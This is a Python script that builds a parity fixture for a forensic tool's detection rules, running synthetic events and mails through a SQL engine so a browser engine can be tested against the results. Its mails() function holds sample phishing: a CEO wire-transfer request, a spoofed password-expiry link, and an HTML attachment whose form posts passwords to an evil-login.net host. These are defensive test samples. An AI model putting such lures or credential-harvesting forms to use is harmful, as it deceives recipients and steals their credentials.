"""Engine parity fixture: the same rows through the SQL engine, recorded for the browser engine test.

The browser engine (rules/engine.ts) exists so that confidential evidence can be analysed without a
row ever reaching the server; the SQL engine (services/store/rules.py) exists for GB-scale cases.
Both must produce the same findings for the same rules and rows. This script builds a small mixed
scenario (Windows events, M365 rows, mails), runs every bundled rule on the DuckDB engine and writes
the rows and the resulting finding keys to tests/fixtures/parity/. frontend/src/rules/parity.test.ts
runs the browser engine on the same rows and fails on any difference.

    .venv\\Scripts\\python.exe tools\\parity_fixture.py        # rewrite the fixture after changing an engine or a rule
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import uuid
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "backend"))
sys.path.insert(0, str(ROOT / "samples" / "synthetic"))
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "forensic.settings")

import make_m365  # noqa: E402
import rule_samples as RS  # noqa: E402
from mail_calibration import examples, message  # noqa: E402

from api.views.meta import load_rules  # noqa: E402
from services.parsers import m365  # noqa: E402
from services.parsers.mail.common import ParseContext, RawAttachment, build_row  # noqa: E402
from services.store import rules as R  # noqa: E402
from services.store.casestore import StoreRegistry  # noqa: E402
from services.store.writers import EventWriter, MailWriter  # noqa: E402

OUT = ROOT / "tests" / "fixtures" / "parity"
SETTINGS: dict[str, Any] = {
    "internal_domains": ["contoso.com", "interne.fr"],
    "expected_countries": ["FR"],
    "vip_names": ["lefevre marie", "alice martin"],
    "admin_accounts": ["administrator", "adm-*"],
    "service_accounts": ["svc_backup"],
    "internal_ips": ["10.0.0.0/8", "192.168.0.0/16"],
    "brands": ["contoso"],
    "trusted_senders": [],
    "businessHours": {"start": 8, "end": 19, "tz": "Europe/Paris"},
    "weekendDays": [0, 6],
}


def events() -> list[dict[str, Any]]:
    rows = list(RS.build())
    for r in make_m365.ual_records():
        rows.append(m365.ual_row(r))
    for s in make_m365.entra_signins():
        rows.append(m365.entra_row(s))
    rows.sort(key=lambda r: r.get("ts") or 0)
    return rows


def mails() -> list[dict[str, Any]]:
    ctx = ParseContext(internal_domains=["contoso.com", "interne.fr"], brands=["contoso"], vip_names=["lefevre marie", "alice martin"])
    rows = [e["row"] for e in examples()]
    rows.append(
        message(
            "Payment update",
            "Please handle this urgent wire transfer today and keep it confidential; I am in a meeting. Thanks, Marie Lefevre",
            reply_to="Marie Lefevre <marie.lefevre.ceo@gmail.com>",
        )
    )
    lure = [
        ("From", "IT Support <it-support@contoso-secure.com>"),
        ("To", "Alice <alice@contoso.com>"),
        ("Subject", "Password expires today"),
        ("Date", "Tue, 1 Sep 2026 09:05:00 +0000"),
        ("Message-ID", "<lure-1@contoso-secure.com>"),
        ("Received", "from mail.contoso-secure.com ([203.0.113.10]) by mx.contoso.com; Tue, 1 Sep 2026 09:05:01 +0000"),
        ("Authentication-Results", "mx.contoso.com; spf=fail smtp.mailfrom=contoso-secure.com; dkim=none; dmarc=fail header.from=contoso-secure.com"),
    ]
    rows.append(
        build_row(
            lure,
            "Your password expires today. Verify your account now: https://login-contoso.evil-login.net/session",
            '<html><body><a href="https://login-contoso.evil-login.net/session">https://contoso.com/portal</a></body></html>',
            [],
            ctx,
        )
    )
    rows.append(
        build_row(
            lure[:2] + [("Subject", "Invoice attached")] + lure[3:],
            "See attached.",
            None,
            [
                RawAttachment(
                    "invoice.html", b'<html><body><form action="https://collect.evil-login.net/x"><input type="password" name="pw"></form></body></html>'
                )
            ],
            ctx,
        )
    )
    for r in rows:
        r.pop("id", None)
    return rows


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    ev_rows = events()
    ml_rows = mails()
    bundled = [x["rule"] for x in load_rules(ROOT / "rules") if "rule" in x]
    with tempfile.TemporaryDirectory() as tmp:
        reg = StoreRegistry()
        reg.configure(Path(tmp) / "cases")
        store = reg.get(str(uuid.uuid4()))
        try:
            w = EventWriter(store, 1)
            for r in ev_rows:
                w.add(dict(r))
            w.flush()
            mw = MailWriter(store, 2)
            for r in ml_rows:
                mw.add(dict(r))
            mw.flush()
            with store.lock:
                stored_ev = store._con.execute('SELECT id, "eventId", ts FROM events ORDER BY id').fetchall()
                stored_ml = store._con.execute("SELECT id, subject FROM mails ORDER BY id").fetchall()
            res = R.run_rules(store, bundled, SETTINGS)
        finally:
            reg.close_all()
    # the writers assign ids in insertion order starting at 1: give the browser rows the same ids
    for i, r in enumerate(ev_rows, 1):
        r["id"] = i
    for i, r in enumerate(ml_rows, 1):
        r["id"] = i
    assert [x[0] for x in stored_ev] == list(range(1, len(ev_rows) + 1)), "event ids are not sequential"
    assert [x[0] for x in stored_ml] == list(range(1, len(ml_rows) + 1)), "mail ids are not sequential"
    expected: dict[str, list[str]] = {}
    for f in res["findings"]:
        expected.setdefault(f["ruleId"], []).append(f["key"])
    for k in expected:
        expected[k].sort()
    (OUT / "events.json").write_text(json.dumps(ev_rows, default=str), encoding="utf-8")
    (OUT / "mails.json").write_text(json.dumps(ml_rows, default=str), encoding="utf-8")
    (OUT / "expected.json").write_text(
        json.dumps(
            {
                "settings": SETTINGS,
                "rules": sorted(r["id"] for r in bundled),
                "errors": res["errors"],
                "findings": expected,
                "diagnostics": {d["ruleId"]: d["reason"] for d in res["diagnostics"]},
            },
            indent=1,
            sort_keys=True,
        ),
        encoding="utf-8",
    )
    fired = len(expected)
    print(
        f"{len(ev_rows)} events, {len(ml_rows)} mails, {len(bundled)} bundled rules: {fired} fired, {sum(len(v) for v in expected.values())} findings, {len(res['errors'])} error(s)"
    )
    for e in res["errors"]:
        print("  error", e)


if __name__ == "__main__":
    main()
